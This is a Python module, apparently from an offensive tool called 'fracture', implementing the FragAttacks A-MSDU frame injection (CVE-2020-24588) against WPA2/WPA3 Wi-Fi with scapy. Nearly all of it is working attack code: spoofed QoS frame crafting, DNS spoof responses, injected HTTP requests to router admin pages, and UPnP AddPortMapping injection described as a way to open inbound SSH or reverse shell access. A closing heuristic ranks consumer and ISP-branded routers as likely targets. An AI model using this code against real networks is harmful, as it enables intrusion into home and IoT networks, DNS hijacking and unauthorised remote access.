"""
injector.py — FragAttacks frame injection engine
CVE-2020-24586 / CVE-2020-24587 / CVE-2020-24588

Implements the A-MSDU aggregation attack to inject arbitrary plaintext
ethernet frames into WPA2/WPA3 networks without the encryption key.

The core technique (CVE-2020-24588):
  The A-MSDU present flag in 802.11 QoS Control is not authenticated by
  CCMP/GCMP. An attacker can set this flag in a forwarded frame, causing
  the receiver to interpret the MSDU payload as an A-MSDU subframe
  (dst_mac + src_mac + len + payload), thereby injecting an arbitrary
  ethernet frame into the victim's network stack.

Target classes:
  - Unpatched routers and IoT devices (most never received CVE-2020-24588 patch)
  - Devices running Linux kernel < 5.12.4
  - Windows systems not updated post-June 2021
"""

import struct, socket, time
from typing import Optional

try:
    from scapy.all import (
        RadioTap, Dot11, Dot11QoS, LLC, SNAP,
        IP, UDP, TCP, DNS, DNSQR, DNSRR,
        Raw, sendp, conf
    )
except ImportError:
    raise SystemExit("Install scapy: sudo apt install python3-scapy")

conf.verb = 0

# ── LLC/SNAP header for IPv4 over 802.11 ──────────────────────────────────────
LLC_SNAP_IP  = b'\xaa\xaa\x03\x00\x00\x00\x08\x00'
LLC_SNAP_ARP = b'\xaa\xaa\x03\x00\x00\x00\x08\x06'

# ── frame crafting ────────────────────────────────────────────────────────────

def _mac_bytes(mac: str) -> bytes:
    return bytes.fromhex(mac.replace(':', ''))

def _pad4(data: bytes) -> bytes:
    """Pad to 4-byte boundary (A-MSDU subframe requirement)."""
    rem = len(data) % 4
    return data + b'\x00' * ((4 - rem) % 4)

def craft_amsdu_inject(ap_mac: str, client_mac: str, inner_ip_pkt_bytes: bytes) -> bytes:
    """
    Build a QoS Data frame with A-MSDU flag set (CVE-2020-24588).

    ap_mac        — target AP BSSID
    client_mac    — associated client MAC to spoof as transmitter
    inner_ip_pkt_bytes — raw IPv4 packet to inject (no ethernet header)

    The receiver processes the inner IP packet as if it arrived from
    a legitimate local source on the network.
    """
    # A-MSDU subframe: [dst(6)][src(6)][len(2)][LLC+SNAP+IP payload][pad]
    ip_payload = LLC_SNAP_IP + inner_ip_pkt_bytes
    sub_dst    = _mac_bytes(client_mac)   # deliver to client
    sub_src    = _mac_bytes(ap_mac)       # appears to come from AP
    sub_len    = struct.pack('>H', len(ip_payload))
    amsdu_sub  = _pad4(sub_dst + sub_src + sub_len + ip_payload)

    # QoS Control: A-MSDU present (bit 7) = 1, TID = 0, ACK = normal
    # Byte layout: [TID(4)|EOSP(1)|ACK(2)|AMSDU(1)] [TXOP/AP PS buffer]
    qos_ctrl = b'\x80\x00'

    frame = (
        RadioTap() /
        Dot11(
            type    = 2,       # Data
            subtype = 8,       # QoS Data
            FCfield = 0x01,    # to-DS: client → AP direction
            addr1   = ap_mac,          # receiver  (AP)
            addr2   = client_mac,      # transmitter (spoofed as client)
            addr3   = ap_mac,          # BSSID
            SC      = 0,
        ) /
        Raw(load=qos_ctrl + amsdu_sub)
    )
    return frame

def inject(iface: str, frame, count: int = 3, inter: float = 0.05):
    """Send a crafted frame via monitor mode interface."""
    sendp(frame, iface=iface, count=count, inter=inter, verbose=False)

# ── DNS injection ─────────────────────────────────────────────────────────────

def craft_dns_spoof(src_ip: str, dst_ip: str, txid: int,
                    qname: str, spoof_ip: str) -> bytes:
    """
    Craft a DNS response that resolves qname → spoof_ip.
    Inject this to race the real DNS server.

    src_ip   — appear to come from the victim's DNS server
    dst_ip   — deliver to the client
    txid     — transaction ID from the intercepted query
    qname    — domain being queried
    spoof_ip — IP to return instead of the real answer
    """
    pkt = (
        IP(src=src_ip, dst=dst_ip) /
        UDP(sport=53, dport=1024) /
        DNS(
            id    = txid,
            qr    = 1,          # response
            aa    = 1,          # authoritative
            qdcount = 1,
            ancount = 1,
            qd    = DNSQR(qname=qname),
            an    = DNSRR(rrname=qname, ttl=60, rdata=spoof_ip),
        )
    )
    return bytes(pkt)

# ── HTTP request injection (router admin) ─────────────────────────────────────

def craft_http_request(src_ip: str, dst_ip: str, dst_port: int,
                       method: str, path: str,
                       headers: dict = None, body: str = "") -> bytes:
    """
    Craft a raw TCP/HTTP request packet for injection.
    Used to reach the router's admin interface from outside the network.

    NOTE: TCP requires a valid sequence/ack handshake for the router to
    process the response. For best results, target HTTP endpoints that
    process the request on receipt without needing the response path
    (fire-and-forget config changes, UPnP-style).
    """
    hdrs = {"Host": dst_ip, "Content-Length": str(len(body))}
    if headers:
        hdrs.update(headers)
    header_str = "\r\n".join(f"{k}: {v}" for k, v in hdrs.items())
    http_payload = f"{method} {path} HTTP/1.1\r\n{header_str}\r\n\r\n{body}"

    pkt = (
        IP(src=src_ip, dst=dst_ip) /
        TCP(sport=54321, dport=dst_port, flags="PA", seq=1000, ack=1) /
        Raw(load=http_payload.encode())
    )
    return bytes(pkt)

# ── UPnP injection ────────────────────────────────────────────────────────────

UPNP_MCAST   = "239.255.255.250"
UPNP_PORT    = 1900
SSDP_DISCOVER = (
    "M-SEARCH * HTTP/1.1\r\n"
    "HOST: 239.255.255.250:1900\r\n"
    'MAN: "ssdp:discover"\r\n'
    "MX: 1\r\n"
    'ST: ssdp:all\r\n\r\n'
)

def craft_upnp_discover(src_ip: str) -> bytes:
    """Inject a UPnP M-SEARCH to discover services on the internal network."""
    pkt = (
        IP(src=src_ip, dst=UPNP_MCAST, ttl=4) /
        UDP(sport=1900, dport=UPNP_PORT) /
        Raw(load=SSDP_DISCOVER.encode())
    )
    return bytes(pkt)

def craft_upnp_add_portmap(src_ip: str, dst_ip: str, control_url: str,
                            ext_port: int, int_ip: str, int_port: int,
                            proto: str = "TCP") -> bytes:
    """
    Inject a UPnP AddPortMapping SOAP request.
    Opens ext_port on the router's WAN interface, forwarded to int_ip:int_port.
    Use to open inbound SSH or reverse shell access from outside.
    """
    soap_body = f"""<?xml version="1.0"?>
<s:Envelope xmlns:s="http://schemas.xmlsoap.org/soap/envelope/"
    s:encodingStyle="http://schemas.xmlsoap.org/soap/encoding/">
  <s:Body>
    <u:AddPortMapping xmlns:u="urn:schemas-upnp-org:service:WANIPConnection:1">
      <NewRemoteHost></NewRemoteHost>
      <NewExternalPort>{ext_port}</NewExternalPort>
      <NewProtocol>{proto}</NewProtocol>
      <NewInternalPort>{int_port}</NewInternalPort>
      <NewInternalClient>{int_ip}</NewInternalClient>
      <NewEnabled>1</NewEnabled>
      <NewPortMappingDescription>fracture</NewPortMappingDescription>
      <NewLeaseDuration>0</NewLeaseDuration>
    </u:AddPortMapping>
  </s:Body>
</s:Envelope>"""

    return craft_http_request(
        src_ip   = src_ip,
        dst_ip   = dst_ip,
        dst_port = 80,
        method   = "POST",
        path     = control_url,
        headers  = {
            "Content-Type": 'text/xml; charset="utf-8"',
            "SOAPAction": '"urn:schemas-upnp-org:service:WANIPConnection:1#AddPortMapping"',
        },
        body = soap_body,
    )

# ── vulnerability pre-check ───────────────────────────────────────────────────

def estimate_patch_status(vendor: str, ssid: str) -> str:
    """
    Rough heuristic based on AP vendor.
    Returns: 'likely_vulnerable' | 'possibly_patched' | 'unknown'

    Most consumer IoT and budget routers never received CVE-2020-24588 patches.
    Enterprise gear (Cisco, Aruba, Ruckus) was patched.
    """
    vendor = vendor.lower()
    ssid   = ssid.lower()

    patched_vendors = ['cisco', 'aruba', 'ruckus', 'meraki', 'ubiquiti', 'unifi']
    vulnerable_vendors = ['tp-link', 'tplink', 'd-link', 'dlink', 'netgear',
                          'belkin', 'asus', 'linksys', 'tenda', 'xiaomi',
                          'huawei', 'zte', 'zyxel']

    if any(v in vendor for v in patched_vendors):
        return 'possibly_patched'
    if any(v in vendor for v in vulnerable_vendors):
        return 'likely_vulnerable'

    # Cheap/home routers often branded by ISP
    if any(k in ssid for k in ['sky', 'bt-', 'virgin', 'xfinity', 'att',
                                 'spectrum', 'home', 'default']):
        return 'likely_vulnerable'

    return 'unknown'
